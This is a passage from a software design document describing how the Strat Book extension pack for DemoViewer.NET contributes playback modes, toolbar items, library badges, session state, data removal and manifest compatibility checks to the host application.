  the suppression and the lane go, and the row re-folds. The three tab-level events (`BandPressed`,
  `LaneLabelRequested`, `EditSpanDragged`) are deleted; nothing raised them for anyone else.
- *The mode.* `ModeToggle` is a contributed mode: the view's toolbar lists `Surface.ModeToggles` as
  `ToggleButton`s bound to `IsOn`, `Label`, `Tooltip` and `IsAvailable` in the slot the hardcoded Review toggle
  had; `Playback2DSurface.TryExecute` gives a keymap action to the toggle that names it first (`TryToggle`:
  flips while available or on, false when off with nothing to show, so Shift+R is nobody's then), then to the
  action handlers. A panel is bound to a mode through `AddPanel`'s `mode`, and `IsShown` folds the gate, the
  open state and the mode; a panel bound to none shows whenever it is open with its gate on. The tab's
  `IsReviewAvailable` is still an open panel whose gate is on, and `IsCardStrip` is now any panel shown
  (`Surface.HasShownPanels`), which the view's panel host and the strip rows bind.
- *The demo and the playhead.* `OnDemoChanged` is raised by the tab at the two moments it attached its tag
  session before: the end of `OnActivated` and of `OnDemoReset`, after the resync. A contribution attaches
  per-demo state there; the context's `DemoPath` may be the demo already attached. `OnPlayheadChanged` is
  raised with the tick wherever the tab calls `Timeline.UpdatePlayhead` (a clock push, the resync), which is
  how Label Mode's target follows the playhead without a click now that the contribution has no `Timeline`
  to watch.

The contribution (`ReviewPanelsPlaybackContribution`, now `IDisposable` because it owns the track) builds the
`TagSession` on attach from `context.GetService<T>()`: `TagStore` (null for session-only tags), `DemoCacheStore`
for the rounds a new tag's `round` is derived from, and `IRoundFactsSource` for its facts. It registers
`TagTrack` and `ProposalTrack` on the lane row in that order with a `TagLaneBehaviour` (Label Mode's pick on a
press, the edit and delete entries, the new label on an empty-lane click, the editor's span on a handle drag)
and a `ProposalLaneBehaviour` (the queue's pick on a press, the review entries); the proposal track's
confidence tints come from the theme tokens the tab used to supply. It registers the Review `ModeToggle`
(id `stratbook.review`, action `ToggleReviewMode`), reads its start from `Playback2D.ReviewMode` and writes
every flip back to the same key, suppresses both lanes while the mode is off, binds the three panels to it,
and sets `IsAvailable` from the two tagging gates, which is what hides the toolbar toggle when both are off.
On `OnDemoChanged` and at attach it binds the session to `context.DemoPath` (fire and forget, the hash from
`DemoSha256` or the file; the identity resolver is a constructor seam for tests); the demo already attached
is kept, a path still being attached is not attached twice (the first activation reaches both the attach
and the demo-change signal before the session's `DemoPath` moves), and a swap runs through `AttachAsync`,
whose `Detaching` lets the palette write its pending tag to the old document first. The playhead hook calls
the palette's `RefreshLabelTarget`. `Detach` writes the palette's
pending tag, disposes the panels, disposes the lane handles (the tracks leave the timeline), then the track
and the session (which flushes to the store), so a pack turned off with a tag pending loses nothing, and a
pack turned off leaves the tab with no session, no lane, no toggle and no handler. Pack off at startup builds
none of it: the tab's timeline carries the four core tracks alone, which also removed two hidden track
toggles the footer used to make room for.

One behaviour changed on purpose. Undo and redo while the palette has the keyboard report handled (true)
even when the tag history is empty; before, the tab returned the real `TagSession.Undo()` result, which made
an empty tag history leave the key unhandled. Returning true is what keeps an empty tag history from falling
through to the annotations' undo now that the focused panel is asked first; the annotations' history stays
the unfocused case's.

The contribution (`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/RoundTagger/Review/ReviewPanelsPlaybackContribution.cs`)
builds `TagPaletteViewModel`, `SuggestionQueueViewModel` and `ReviewPanelViewModel` over its session
with `TagPaletteStore`, `SuggestedTagsService` and `SettingsService` from `context.GetService<T>()`, and
registers them as three panels: the palette (order 0, gate `playback2d.tagger`), the review panel (order 1,
`ReviewPanelView` in the pack: the Suggested / Labels toggle, the shared editor and the Labels list the core
view used to carry inline; open while either gate is on) and the queue (order 2, gate
`playback2d.suggestedtags`, its view shown while the Suggested tab is selected). The persisted palette choice
and the background-sweep opt-in move with it. Pack off builds nothing; the host attaches and detaches it live,
and `Detach` disposes the three view models after writing the palette's pending tag.

As built by item 20 (`Extensions/ScenePointer.cs`, `Extensions/ToolbarItem.cs`, `Extensions/IPlaybackSurface.cs`,
`Modules/Playback2D/ISceneFrameHost.cs`, `Modules/Playback2D/Scene2DHost.cs`): `CurrentFrame`, `Zones` and
`AddMapClickHandler` are gone from the surface, and so is the tab's `TryTagPositionAt` forwarder to
`Surface.TryHandleMapClick`. `ISceneFrameHost` itself keeps `CurrentFrame` and `Zones`: `Scene2DHost` still
reads them directly, for the zone-outline overlay and to build each `ScenePointer` in `TryPrimaryPress` (the
strat canvas's own `TryTagPositionAt` reads neither; it resolves places through `PlacesFor`). `ISceneFrameHost`
trades its one-off `TryTagPositionAt(level,
x, y)` for a default-`false` `TryPointerPreHandler(ScenePointer pointer)`; `Scene2DHost.OnPointerPressed` builds
one `ScenePointer` per primary press not diverted to pan (Space, Ctrl, the middle button) and offers it to the
bound host before the router. `Playback2DTabViewModel` forwards its `TryPointerPreHandler` to
`Surface.TryHandlePointerPress`, which tries every `AddPointerPreHandler` registration in order; the strat
canvas implements it as `ISceneFrameHost.TryPointerPreHandler(pointer) => TryTagPositionAt(pointer.Level,
pointer.WorldX, pointer.WorldY)`, an explicit forwarder that keeps its own public `TryTagPositionAt` (Set On
Map) exactly as the ~30 strat canvas tests call it. `ScenePointer.Zones` is a `Func<PlaceResolver?>`, not a
value: the review contribution's old `OnMapClick` read `surface.Zones` only after the focus checks passed, and
an eager field would force `LoadedMapAsset.ZoneLoad` on every pan click instead.

`AddToolbarItem` and the overflow menu's entries read the same `Surface.ToolbarItems` list
(`Playback2DSurface`, ordered by `ToolbarItem.Order`); `Playback2DView.axaml` renders it in the slot the
static "Rounds like this" `Button` held, and `Playback2DView.axaml.cs` rebuilds the overflow `MenuItem`s from
it on every open, after the divider `Separator` (`IsVisible="{Binding Surface.HasToolbarItems}"`, as the toolbar
row's own divider is). `TryExecute` tries a `ModeToggle` whose `Action` matches first, then a `ToolbarItem`
whose `Action` matches (`item.Run(_frame())`), then the `AddActionHandler` list, so the button, the menu entry
and the keymap action are one funnel. The Situations contribution
(`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/Situations/SituationsPlaybackContribution.cs`) registers the button's own text,
"Rounds like this", as `Label` (icon `⌕`, restoring today's button face, which the menu entry does not carry)
and keeps the tooltip's "Find rounds like this" wording, both with that funnel (`Playback2DAction.FindRoundsLikeThis`);
its `Run` resolves `IFindRoundsLikeThis` through `context.GetService<T>()` as `TryFindRoundsLikeThis` used to
from `App.Services`. The item is added only while `IModuleContext.MapName` is non-empty (checked at attach,
for a live pack toggle with a demo already open, and on every `OnDemoChanged`) and removed when it closes, so
"available only with a demo and a map name" is now presence, not just a silent refusal. Label and tooltip read
`IPlaybackSurface.GestureHint`, as `FindRoundsLikeThisLabel`/`FindRoundsLikeThisToolTip` did, and refresh on
`KeymapChanged`. J/K
(`NextSituationResult`/`PrevSituationResult`) move to the same contribution through `AddActionHandler` (item
17's seam), gated by the Situations tab's own feature exactly as the tab gated them. The tab's `FindRounds`,
`SituationResults`, `IsSituationResultWalkEnabled`, the two label/tooltip properties, `FindRoundsLikeThisCommand`,
`TryFindRoundsLikeThis`, the tab's private `GestureHint` and `using DemoViewer.NET.Modules.Situations` are gone;
`PackBoundaryTests` lists no item-20 edge for `Playback2DTabViewModel.cs`.

`AddLayer` and `AddTool` exist for completeness and for (b). For (a), the token tool and guides layer can
stay core-registered: they are inert without a strat frame host and cost nothing. Code keeps the word
"pack" for the type names; user-facing copy says "extension" (decision 4).

**As built by item 26, not on `IPlaybackSurface` but on `Scene2DHost` directly.** Nothing contributes a
layer or a tool to the 2D Playback tab yet, so `IPlaybackSurface.AddLayer`/`AddTool` are still unbuilt; the
strat canvas does not go through a pack contribution or `IPlaybackSurface` at all; its own `StratCanvasView`
mounts a private `Scene2DHost` instance directly in its XAML (`<pb:Scene2DHost x:Name="Host" />`), distinct
from the Playback2D tab's. `Scene2DHost` gained the same two members, narrower: `AddTool(IPointerTool tool)`
is `Router.Register(tool)`; `AddLayer(string layerId, Func<ISceneLayer> layer)` adds the layer once,
immediately, and keeps the factory so a release/rebuild (a re-parent, a re-template) can rebuild it the way
the fixed layer set already rebuilds itself. Both are called exactly once, from `StratCanvasView`'s
constructor, right after `FindControl<Scene2DHost>("Host")`: `host.AddTool(new TokenTool())` and
`host.AddLayer(SceneLayerIds.Guides, () => new GuideLayer(() => (host.FrameHost as IGuidesHost)?.Guides ??
SceneGuides.None))`. Nothing calls either for the Playback2D tab's own host, so pack off (and the regular
tab, pack on) carries neither: not inert-and-present as before, but absent. `TokenTool` and `GuideLayer` are
pure consumers of core contracts (`IPointerTool`, `ISceneLayer`) and move to the extension with the rest of
item 26; `ITokenEditor` and `SceneGuides` do not, because `IToolServices.Tokens` and the new `IGuidesHost`
need the types regardless of whether the pack is loaded. `SceneHostToolServices.Tokens` reads
`(host.FrameHost as ITokenEditingHost)?.TokenEditor` in place of the removed `ISceneFrameHost.TokenEditor`.

### 7.4 Library, settings, session, stores

```csharp
public interface ILibraryContribution
{
    IEnumerable<LibraryFilter> Filters { get; }      // Team
    LibraryBadge? BadgeFor(DemoLibraryEntry entry);  // provenance chip; must be O(1), no I/O
}

public interface ISessionParticipant
{
    JsonElement? Snapshot();
    void Restore(JsonElement state);                 // must tolerate an old shape
}

public sealed record StoreDescriptor(string Id, string Label, StoreRoot Root, IReadOnlyList<string> Paths);
```

As built (item 22, `Extensions/IPackContributions.cs`): one filter and one badge per contribution rather than
a list of filters, since the Library hosts N *contributions* (each optionally offering a filter, a badge, or
both) instead of one contribution offering N filters. `LibraryFilter(Label, Items, Matches)` carries its own
items and predicate; `LibraryFilterItem(Key, Display)` reserves `Key == ""` as the neutral "All" choice the
Library skips when applying predicates. A badge needs a fourth member beyond the sketch,
`bool HasBadge { get; }`: `BadgeLabels` alone cannot say whether a contribution renders a badge at all, since
a read-only badge (no settable menu) legitimately has an empty label list. `FeatureId` (nullable, default
`null`) and `Changed` complete the interface, matching 7.2's general contract; `IPackContributions.Library(...)`
stamps a null `FeatureId` to the owning pack's id the same way `SettingsPage` does, through a small internal
wrapper (`PackContributions.StampedLibraryContribution`) rather than a record `with`, since `ILibraryContribution`
is an interface, not a record. `LibraryTabViewModel` owns a generic host: it calls into a contribution only
while `_isFeatureEnabled(contribution.FeatureId)` is true (set once by `MainViewModel` to `_gate.IsEnabled`),
subscribing to `Changed` only on that transition, so nothing behind `Filter`/`BadgeFor` is ever touched while
off. One `LibraryFilterViewModel` per on filter contribution is added to `ObservableCollection<LibraryFilterViewModel>
Filters`, kept as the same instance across a data refresh (`Rebuild`, preserving the ComboBox selection by
`Key`) and removed only on a gate transition (`RebuildFilters`); `ApplyFilter` folds every entry's `Matches`
in. The badge is a single slot (`ActiveBadgeContribution`, the first on contribution with `HasBadge`): the
plan's "N badges" is the contribution list, not the card UI, which renders one chip, a documented limit a
second badge-granting pack would need to lift. `LibraryTabViewModel`/`MainViewModel` lost `TeamIdentityService`
and `IDemoProvenanceSource` entirely (ctor params and `using`s both); `MainViewModel` no longer force-builds
either service at shell construction when the pack is off, since the old code's two `sp.GetRequiredService<T>()`
ctor arguments are gone. With the pack on, the default, the resolve still happens at construction, just
inside `LibraryTabViewModel`'s own `RebuildFilters` rather than `MainViewModel`'s ctor argument, so the
timing is unchanged from before item 22; only the off case is actually lazier now (see §8's First Run note).
`DemoEntry` (`Modules/Library/DemoLibraryModels.cs`) traded `ProvenanceLabel`/
`ProvenanceIsOverride`/`ProvenanceDisplay`/`ProvenanceTooltip` for generic `BadgeLabel`/`BadgeTooltip`/
`BadgeIsPinned`; the "unlabeled" fallback and the three-state tooltip text both moved into
`ProvenanceLibraryContribution.BadgeFor`/`BadgesFor`, which always returns a badge once the service
resolves (an entry the cache has not indexed yet also reads "unlabeled", collapsing a distinction the old
field-level null preserved but the display never showed). The pack's two contributions,
`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Services/Teams/TeamLibraryContribution.cs` and
`.../Services/Provenance/ProvenanceLibraryContribution.cs`, each take a `Func<T>` resolver (no DI
registration of their own, matching item 16's `CreateStratPlaybackContribution`) and an optional
`featureId` constructor parameter so a caller outside `StratBookPack.Contribute` (a shell test) can name
the pack id explicitly instead of relying on the stamp.

Review pass: `BadgeFor` stayed for a single-entry read, but a full refresh calls a second interface member,
`BadgesFor(IEnumerable<DemoEntry>)` (default forwards to `BadgeFor` per entry), so
`ProvenanceLibraryContribution` can call `IDemoProvenanceSource.ResolveAll` once for the whole card grid
instead of once per card (`Resolve` re-reads and copies Team Identity's override list on every call).
`LibraryTabViewModel.OnContributionChanged` only calls `RefreshBadges` when the changed contribution is the
current `ActiveBadgeContribution`, so the Team filter's own `Changed` (a rename) never re-runs the badge
batch; it also now adds a `LibraryFilterViewModel` for a contribution whose `Filter` goes from null to
non-null via `Changed`, not only on a gate transition. `LibraryFilter` gained `Tooltip` (null defaults to
`Label`); `TeamLibraryContribution` sets it to "Filter by team" to keep the pre-refactor text.
`ILibraryContribution` gained `BadgeResetTooltip` (default null) so the reset row's own tooltip ("Let the
clan tags, the header and Team Identity decide") comes from the contribution, not a hardcoded string in the
host; `LibraryTabViewModel.BadgeMenuEntries` is `IReadOnlyList<LibraryBadgeMenuEntry>` (`Label`, `IsReset`,
`Tooltip`), not a flat string list, and the view styles a top border on the `IsReset` row's `MenuItem`
rather than mixing a literal `Separator` into the `ItemsSource`. `HasTeamFilter` (unbound) was dropped;
`HasProvenance`/`SetProvenance` renamed `HasBadge`/`SetBadgeLabel`.

Theme tokens are not a contribution in (a) or (b): they stay in the core dictionaries, which cost nothing
when unused. A pack token manifest only matters for third-party add-ons.

As built by item 23 (session only; `ILibraryContribution`/`StoreDescriptor` are items 22/24): no
`IPackContributions.Session` and no standalone `ISessionParticipant`. Wiring the sketch above would have
meant handing `MainViewModel`'s constructor a new `PackContributionSet`-derived parameter, and that
constructor region is item 22's for the same window. Instead `IHostTabViewModel` (`ViewModels/Shell/`)
carries three new, all-default members: `string? SessionPackId`, `JsonElement? SnapshotPackState()`,
`void RestorePackState(JsonElement state)`. They are new names, not the sketch's `Snapshot`/`Restore`,
because `IHostTabViewModel` already inherits `IWorkspaceTabViewModel.SnapshotState()`/`RestoreState(object?)`
(the per-TAB blob in `SessionPayload.ModuleTabs`, applied once on first activation) and a same-named,
different-signature override would shadow it (CS0108) and risk double-persisting the hub under both keys.
`SessionPayload.StratBook` becomes `Dictionary<string, JsonElement>? Packs`, keyed by pack id
(`StratBookPack.PackId`, `"net.demoviewer.pack.stratbook"`), a new trailing nullable parameter;
`ModuleTabs` is unchanged. `MainViewModel.RestoreSession`/`SnapshotSession` walk the existing `_hosts` list
(unconditional, pack-on or off, built once in `BuildWorkspaceTabs`) and read/write each host's blob by
`SessionPackId`, gated on `host.Tab.FeatureId` (the pack's umbrella gate, as `PackContributions.HostTab`
stamps it) through `_gate?.IsEnabled(...)`. A pre-`Packs` file's top-level `StratBook` member folds once
into `Packs` under the pack's id via `IJsonOnDeserialized`/`[JsonExtensionData]` on `SessionPayload`, the
same mechanism item 21 used for the demo cache record; `SessionPayload` keeps its own literal copy of the
id string (`Models` cannot depend on `Services` or on the pack) rather than naming `StratBookPack.PackId`.
An already-present `Packs` entry for that id wins. `StratBookHubViewModel` implements the three members
over `StratBookLayout` (now in the extension project,
with `StratBookLayoutState`), whose `RestoreSessionState(JsonElement)` reads `RailCollapsed`/`ListCollapsed`
independently and accepts only `True`/`False`, so a missing member, a wrong-typed one, or a non-object
blob leaves that pane as it is instead of throwing or discarding the rest.

The hub's view model is built unconditionally in `BuildWorkspaceTabs` regardless of the gate
(`StratBookHubAccess`'s own doc comment says so), so "pack off" here is a gate check in the session code,
not something that falls out of nothing existing, and a live toggle needed its own handling rather than
falling out of the restart-time restore/snapshot pair. `_loadedPackSessions` (every pack id loaded at
startup, kept for the session's life, unlike the tab-restore-only `_pendingRestore`) is `RestorePackSessions`'s
source both at startup (`RestoreSession`) and on a live enable (`ApplyGateChange`, which calls it after
`ReconcileTabs`): a pack id already in `_restoredPackIds` (populated exactly when `RestorePackState` is
called) is skipped, so a mid-session enable restores the carried blob exactly once, the moment the pack's
gate is next observed on, and a later unrelated gate change is a no-op. `SnapshotPackSessions` writes a
host's live state when its pack is enabled right now OR its id is in `_restoredPackIds`; the second
clause is what keeps a value set while a pack was on from being lost to a later disable (the pack's own
blob, not the one loaded at startup, wins), and a pack that was never enabled this session still carries
its loaded blob through unread and unwritten.

**As built by item 24.** `StoreDescriptor` gained a fifth field, `IsUserWork`, read by the Settings
confirmation; `IPackContributions` gained `Store(StoreDescriptor)` and `DataRemoval(IPackDataRemoval)`,
aggregated on `PackContributionSet` as `Stores` and `DataRemovals`. `PackDataRemover`
(`Services/DemoCache/PackDataRemover.cs`) resolves a descriptor's paths against `AppPaths.ConfigRoot` or
`AppPaths.DemoCacheDir`, refuses anything rooted, carrying a `..` segment, or resolving to the root itself,
never follows a reparse point or deletes a `.dem` file, and strips a pack's `Packs` entry and matching
`PackStamps` from every demo cache record and index row. A demo-sidecar family (the grenade walk's
siblings under `cache/demos/`) is declared as `"demos/*<suffix>"`: the directory is listed once and the
suffix matched by ordinal string comparison in managed code, never handed to a filesystem glob, so it
cannot widen to match the core record sidecars beside it. Both of `PackDataRemover`'s public methods run
through `QueueWork.Run` on serial `ownerTag` (`QueueWork.RunAsync` has no serial parameter), so a delete
never overlaps the pack's own release item on the same serial.

`StratBookStores.All` is the pack's descriptor list, corrected against the real writers rather than this
section's original table: `grenade-lineups.json.gz` and `grenades-v3.attempts.json` are under the CACHE
root (`GrenadeLineupStore`/`GrenadeStoreMigration` both combine with `DemoCacheStore.CacheRoot`, never
`AppPaths.ConfigRoot`), and `review-queue.json` is dropped (decision 10.1: Review Queue is core, shared
with Reels, live with the pack off; deleting it would take Reels' own queue with it). Facet ids for the
record strip are the pack's four evaluator ids (`StratBookDataRemoval.FacetIds`), not a separate list: a
`PackStamp.Id` is a facet, not a pack id, and the convention every writer follows is that a stamp always
rides with the payload it describes.

**Release path, as decided:** turn the pack off first, delete, leave it off. `StratBookDataRemoval.DeleteAsync`
writes the gate override off through `SettingsService.Write` (the same write the Extensions master switch
makes) and awaits `PackSwitch.Pending`. That wait is never stale: `FeatureGate.RaiseChanged` fires inline,
synchronously, for a self-write made from the UI thread, so by the time the override write returns,
`PackSwitch.Disable` has already queued the release and updated `Pending`. Only once that release has run
(residents dropped, the lineup flush and the signature cache's own write done) does the delete touch any
file, so nothing the release still owns is deleted out from under it. The alternative the plan offered,
calling a lifecycle release directly and staying on, was not taken: it would need its own synchronization
with whatever queue item is draining the release, which `PackSwitch.Pending` already gives for free from
the existing switch-off path, with no new seam.

A re-check guards the gap `Pending` cannot: `DeleteAsync` reads `IsEnabled(PackFeatureId)` again right
after the wait, before calling the remover, and the remover itself evaluates a `stillOff` predicate inside
the queued job, right before it touches a file, so a re-enable landing between the wait and the job
actually running aborts cleanly on either side rather than deleting against a live pack.

**The blocker this surfaced:** `StratStore`, `TagStore`, `DossierNotesStore`, `VetoHistoryStore`,
`WatchedSituationsService` and `StratMiningService`'s state file are explicitly NOT released on disable
(§8: "the pack's small user-truth stores... are not released"), so deleting their files while they stay
resident in memory would leave the deleted content on screen if the pack were re-enabled in the same
session, and the next edit would save it straight back. `DeleteAsync` closes this by calling each store's
own recovery after a successful delete: `StratStore.RebuildIndexFromDisk` and `TagStore.RebuildIndexFromDisk`
already existed (the lost-index recovery); `DossierNotesStore.Reload`, `VetoHistoryStore.Reload` and
`WatchedSituationsService.Reload` are new, each clearing exactly what the store's own `Load`/`Refuse` pair
already touches; `StratMiningService.ResetState` is new for the same reason, and matters more than the
others because `LoadState`'s own retry logic merges a fresh read with whatever is still in memory, which
would otherwise fold the deleted dismissed/promoted keys back in on the next attach. `TagPaletteStore.Reload`
and `ProfileStore.Reload` (both pre-existing) cover `palettes/` and `suggested-tags/` the same way.

### 7.5 Commands and keybindings

```csharp
public sealed record CommandDescriptor(
    string Id,                // "stratbook.step.add"; persisted override key
    string Label,
    string Scope,             // "playback2d", "playback2d.palette", "stratbook.canvas"
    KeyGesture? DefaultChord,
    Func<CommandContext, bool> Run,
    Func<CommandContext, bool>? CanRun = null);
```

`Run` returns `bool`, not `void`: the existing dispatch convention (`Playback2DTabViewModel.ExecuteAction`
returning false means unhandled, so the key falls through to whatever else wants it) has to survive
through a command, or a resolved key that does nothing would read as handled anyway.

Core `Playback2DAction` values map to command ids one to one, so persisted keybind overrides keep working.
Item 19 landed ids equal to the action's own enum name (not the `stratbook.step.add` style sketched
above), since that is what keeps a persisted `KeybindOverrides` row readable unchanged; item 19's own
report is the place to check before copying the dotted style for a future pack. A command palette, if one
is ever built, reads the same registry.

### 7.6 How the gate folds in

- `pack.stratbook` is a `FeatureScope.Pack` descriptor with per-category defaults. Every Strat Book tab,
  section and sub-feature id gets `ParentId = "pack.stratbook"` (directly, or through its tab).
- The existing resolver order stays: Required, override, category default, group leader, then cascade up
  the parent chain. The only rule change is that a `Tab` may now have a parent, and only a `Pack`.
- "Plugin enabled" is exactly `IsEnabled("pack.stratbook")`. The category model keeps working: if Q2 says
  consumers should not see the Strat Book by default, that is `Defaults(false, true, true)` on one id.
- Per-section overrides stay meaningful under an enabled pack (a user can hide Dossier and keep Strats).
- The gate becomes the one authority for background work too, not just visibility: evaluators and pack
  lifecycle read the same answer. That requires one new rule in the gate's contract: **a pack id never
  fails open.** An unknown `pack.*` id resolves off, so a typo cannot silently enable background work.

### 7.7 Manifest and compatibility (as built by item 33)

Everything here lives in the app under `DemoViewer.NET.Extensions` (`ExtensionHost.cs`) and
`DemoViewer.NET.Extensions.Manifest` (`SemVersion`, `VersionRange`, `ExtensionManifest`,
`ExtensionHostInfo`, `PackCompatibility`, `PackStatus`). Core references no extension; the extension
references these.

**The manifest.** `src/Extensions/StratBook/extension.json`, one file embedded in the extension assembly
under the logical name `extension.json` and copied beside the DLL on build (`None` with
`CopyToOutputDirectory`, which flows through every project reference, so a head's publish output and the
test binary's directory both carry it). The loader (item 34) reads the on-disk copy before loading the
assembly; the pack reports the embedded copy in process through `IFeaturePack.Manifest`.

```json
{
  "id": "net.demoviewer.pack.stratbook",
  "name": "Strat Book",
  "version": "{nbgv}",
  "assembly": "DemoViewer.NET.Extensions.StratBook.dll",
  "entryType": "DemoViewer.NET.Extensions.StratBook.StratBookPack",
  "requiresHost": "^1.0",
  "requiresCs2DemoKit": "0.13.0-beta0001"
}
```

The committed file is a template (item 39, section 7.11): `"{nbgv}"` is replaced at build with the version
Nerdbank.GitVersioning computes from `src/Extensions/StratBook/version.json`, and the stamped copy is what is
embedded and copied beside the DLL. The placeholder is not a semantic version on purpose, so an unstamped
copy fails to parse rather than load.

| Member | Required | Meaning |
|---|---|---|
| `id` | yes | The pack id; must equal `IFeaturePack.Id` or the status is `ManifestInvalid`. Reverse-DNS, no whitespace. |
| `name` | yes | The user-facing name. |
| `version` | yes | The extension's own SemVer 2.0 version. Stamped at build from the extension's `version.json`; the committed template holds `{nbgv}`. |
| `assembly` | yes | A bare `.dll` file name; a path is refused so a manifest cannot point outside its own directory. |
| `entryType` | yes | The full name of the `IFeaturePack` type the loader instantiates. |
| `requiresHost` | yes | A range over `ExtensionHost.ContractVersion`. |
| `requiresCs2DemoKit` | yes | A range over `ExtensionHost.Cs2DemoKitVersion`. Exact by default: the extension uses CS2DemoKit types directly, so only the same version is known good. |
| `minAppVersion` | no | The oldest app release the extension runs on. |

Parsing is strict about the required members (absent, null or blank fails) and ignores members it does
not know, so a newer manifest loads on an older app, which judges it by the fields it understands.
Comments and trailing commas are accepted.

**Ranges.** `VersionRange` covers the npm syntax: comparator sets (`>=1.0.0 <2.0.0`), caret (`^1.0`:
same major, and below 1.0 same minor), tilde (`~1.2`: same minor), a bare version (exact, or an X-range
when partial: `1.2` is `>=1.2.0 <1.3.0`), `*` for any, and `||` between alternatives. A prerelease
satisfies a set only when a comparator in it names a prerelease of the same major.minor.patch, so
`^1.0` never admits `1.5.0-rc1` while `0.13.0-beta0001` matches itself exactly; `*` alone admits
everything, prereleases included, because a pre-1.0 CS2DemoKit is the normal case. Two ranges are equal
when written the same.

**The host.** `ExtensionHost` exposes three values and `Current` as one `ExtensionHostInfo`:

- `ContractVersion`, 1.0.0 today, a constant bumped by hand with the change that needs it. The contract is
  the surface a pack's own assembly references or implements, not every type under
  `DemoViewer.NET.Extensions`: host-side types that no pack touches (`Loading`, `CompatibilityReport`)
  change freely. **Major** on a breaking change to a type a pack does reference or implement, including
  `IModuleContext`, `IHostTabViewModel` or the `IPlaybackSurface` family: a removed or renamed member, a
  changed signature, a new abstract member on an interface a pack implements. **Minor** on an additive
  change: a new contribution kind, a new optional member with a default. Never patch; a contract has no
  behaviour of its own to fix. Decision 6 (section 10) adds a release rule on top: a **major** bump of the
  contract ships only with a major release of the app, so an extension built for one app major keeps
  loading on every later minor and patch of it.
- `AppVersion`, from `AppVersionInfo.CurrentReleaseVersion`; null on an unstamped build.
- `Cs2DemoKitVersion`, read at runtime from `CS2DemoKit.Analysis`'s informational version. NBGV stamps
  `0.13.0.1-beta0001+9f1e3e3b4a`; the fourth component and the metadata are dropped so the value equals
  the package version it was restored from. The assembly version is the fallback when the attribute is
  missing. The string is nowhere else in code: `ExtensionHostTests` pins the value to the
  `Directory.Packages.props` pin, so a bump that leaves the manifest behind fails a test, not a user.

**The check.** `PackCompatibility.Check(manifest, host)` returns `Compatible` or the first failing
reason, in this order: `HostContractMismatch(required, actual)`, `Cs2DemoKitMismatch(required, actual)`,
`AppTooOld(required, actual)`. An unstamped app skips the app-version check (a developer build, not an
old release). `PackStatus.Evaluate(pack, host)` wraps it for a configured pack and adds the two manifest
failures a check never sees: a `Manifest` getter that throws `ExtensionManifestException`, and a manifest
whose `id` is not the pack's; both read as `ManifestInvalid(reason)`. Nothing in the path throws for a bad
pack, since the point is to keep it out rather than take the app down with it.

**Where it runs.** Inside `FeaturePacks.Configure` (and `ConfigureIfUnset`): the head's list is judged as
it is set, and the frozen value is the list of `PackStatus`, so no reader can see a pack before its
verdict exists. The static exposes three views of that one value: `Default` (every declared pack, as
before), `Compatible` (the declared packs that passed) and `Statuses`. The composition root
(`App.BuildServices(windowService)`), `FeatureCatalog` (its lazy `Composed` fallback), `JobKindRegistry.Default`,
`CommandRegistry.Default`, the `ViewLocator`'s pack-assembly search and the shutdown flush loop all read
`Compatible`. So an incompatible pack never runs `Register` or `Contribute`, never puts a descriptor in
the catalog (the gate then reads its id as unknown and resolves it off, section 7.6), and never resolves
a view. This is the only point that is before every one of those readers: `FeatureCatalog.Composed` and
the two registries build from the static on first touch, which can happen before `BuildServices`, so a
check inside `BuildServices` would already be too late for them.

**The status surface.** Settings reads `FeaturePacks.Statuses` (injected, so tests and UiCapture pass a
fake). Every pack master row shows its manifest version beside the scope badge. A pack that failed has
no catalog row, so Settings synthesizes one from its status: a `FeatureScope.Pack` row named from the
manifest (or the pack id when the manifest did not parse), locked through the row's existing lock-hint
path (`incompatible`), the switch off and disabled, and the reason in user terms beneath the
description, for example "Strat Book 1.2.0 needs app contract ^2.0; this app provides 1.0.0". A stray
set of the row writes no override. The first-run wizard asks only about catalog packs, so an
incompatible extension is absent from its Extensions step. Copy says "extension", never "pack". The
UiCapture variant `settings-extensions-incompatible` renders the Strat Book row with its version and a
fake second extension in that state.

**The browser head** is unchanged: it compile-links the extension, the same check runs at configuration
and passes.

**The compatibility matrix test (item 38).** `CompatibilityMatrixTests`
(`src/App/DemoViewer.NET.App.Tests/Extensions/CompatibilityMatrixTests.cs`) is the release gate: it reads
the shipped manifest from the repo (walking to the filesystem root for `DemoViewer.NET.slnx`, no fixed
cap, since a release gate must fail loudly rather than skip when it cannot find its own repo), from the
copy beside the test binary, and from `new StratBookPack().Manifest` (the embedded copy the loader judges
the bundled pack by), asserting all three equal. It checks every axis against `ExtensionHost.Current`
separately rather than relying on `Check`'s single first failure, pins `requiresCs2DemoKit` to the
`Directory.Packages.props` pin exactly, and asserts `requiresHost` is bounded below the next major. A
table test pins `PackCompatibility.Check`'s semantics over representative host/manifest pairs.

**The reference check.** The extension's compiled `GetReferencedAssemblies()` is checked against the app
assembly's own transitive closure (loaded by simple name, minus the BCL), not a fixed list: the extension
references `CS2OpenDev.Sdk`, `CS2OpenDev.Protos`, `Google.Protobuf`, `DemoViewer.NET.Modules.Abstractions`
and `.Modules.Abstractions.Ui` directly, five of the eighteen non-BCL assemblies it references today, none
in this section's example families; a fixed list drawn from those families would have missed them. Every
one of the eighteen is app-shipped, so the private allowlist is empty today; the heads are deliberately not
walked, so a dependency only a head adds trips the exhaustiveness test instead of passing unnoticed. The
baseline is the test process's own dependency closure (what `dotnet test` restores), not the Desktop
head's publish output; 7.8's `CheckReferences` below covers the loaded, published app. The check also sees
only the `AssemblyVersion` attribute (`0.13.0.0` for any `0.13.0-*` CS2DemoKit build), so a
prerelease-label drift is caught by the exact-pin assertion above, not by this one.

`CompatibilityReport.Describe` (`src/App/DemoViewer.NET/Extensions/Manifest/CompatibilityReport.cs`)
renders `Check`'s verdict and every value that fed it as one line, for item 37's packaging step to print
and item 36's updater to log. No pack references or implements it, so per the contract rule above it needs
no `ContractVersion` bump.

A contract bump (section 7.7's major/minor rule) must update `requiresHost` in `extension.json`, or
`RequiresHost_IsSatisfiedByTheCurrentContract_AndWouldBeViolatedByTheNextMajor` fails. A CS2DemoKit bump
must move all three `CS2DemoKit.*` pins in `Directory.Packages.props` and `requiresCs2DemoKit` in one
commit, or `RequiresCs2DemoKit_EqualsTheDirectoryPackagesPropsPin_Exactly` fails.

### 7.8 Loading (as built by item 34)

Everything here lives in the app under `DemoViewer.NET.Extensions.Loading` (`ExtensionLoader`,
`ExtensionCandidate`, `ExtensionLoadContext`, `ShippedPack`, `ITrustPolicy` and `TrustPolicy`,
